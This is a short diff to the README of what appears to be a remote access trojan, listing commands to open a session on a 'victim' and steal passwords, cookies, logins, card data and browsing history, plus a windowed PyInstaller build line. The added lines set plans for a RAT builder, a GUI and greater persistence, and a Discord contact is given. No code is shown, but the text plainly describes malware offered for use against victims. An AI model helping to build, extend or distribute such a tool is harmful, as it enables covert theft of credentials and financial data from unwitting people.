@@ -60,7 +60,12 @@ pyinstaller filename --one-file --window
 !session : Create a session for your victim. (Needs a restart to use.)
 !passwrd : Get Passwords & Accounts Cookies & Logins & Cards & Web History & Downloads & Info.
 ```
-
+## **To Do:**
+```
+Make a builder for Rat.
+Make a Gui for builder.
+Make it more durable/permanent.
+```
 ## **Contact**
 <li>Discord : 0giv
 
